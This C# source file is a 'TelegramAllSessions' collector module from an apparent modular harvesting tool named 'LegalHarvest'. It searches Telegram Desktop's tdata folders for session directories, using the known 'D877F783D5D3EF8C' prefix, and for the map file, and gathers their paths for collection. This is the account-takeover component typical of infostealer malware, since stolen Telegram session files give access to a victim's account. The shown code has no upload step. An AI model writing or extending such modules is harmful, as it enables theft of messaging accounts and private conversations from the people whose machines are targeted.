using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class TelegramAllSessionsModule : ICollectorModule
    {
        public string ModuleName => "TelegramAllSessions";
        public bool CanExecute() => true;

        private readonly string[] telegramPaths = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Telegram Desktop", "tdata")
        };

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            foreach (string tdata in telegramPaths)
            {
                if (!Directory.Exists(tdata)) continue;
                foreach (string dir in Directory.GetDirectories(tdata, "D877F783D5D3EF8C*"))
                    foreach (string file in Directory.GetFiles(dir))
                        items.Add(new CollectedItem { Category = "TelegramSession", Name = $"SessionFile ({Path.GetFileName(dir)})", Value = file, Timestamp = DateTime.Now });
                string mapFile = Path.Combine(tdata, "map");
                if (File.Exists(mapFile)) items.Add(new CollectedItem { Category = "TelegramSession", Name = "MapFile", Value = mapFile, Timestamp = DateTime.Now });
            }
            return items;
        }
    }
}
